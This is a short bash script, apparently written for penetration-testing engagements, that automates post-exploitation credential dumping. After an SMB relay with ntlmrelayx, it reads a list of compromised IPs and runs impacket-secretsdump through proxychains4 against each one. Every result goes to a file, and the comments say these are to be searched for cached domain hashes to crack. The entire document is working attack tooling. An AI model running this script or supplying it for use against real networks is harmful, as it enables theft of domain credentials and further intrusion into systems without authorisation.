#!/bin/bash
#This script is setup for after you have exploited SMB Signing with ntlmrelayx and utilizes proxychains4. Ensuring those tools are configured to work with each other is necessary before using this. 
#It requires a list of IPs of machines you have compromised. (Also has the domain/user:domain hardcoded in so you'll need to change that per engagement or per user. 
#The purpose of this to automated grabbing secrets dumps so you can cat them out, grep for cached domain hashes, and save that to crack them. 

input_file="ips.txt"
output_dir="secretdumps"
impacket_command="proxychains4 -q impacket-secretsdump DOMAIN/USER:DOMAIN@"
#test_command="ping -c 2 "

mkdir -p "$output_dir"

while read -r ip_addresses; do
    output_file="$output_dir/secretsdump.${ip_addresses}.txt"
    $impacket_command"$ip_addresses" > "$output_file"
done < "$input_file"
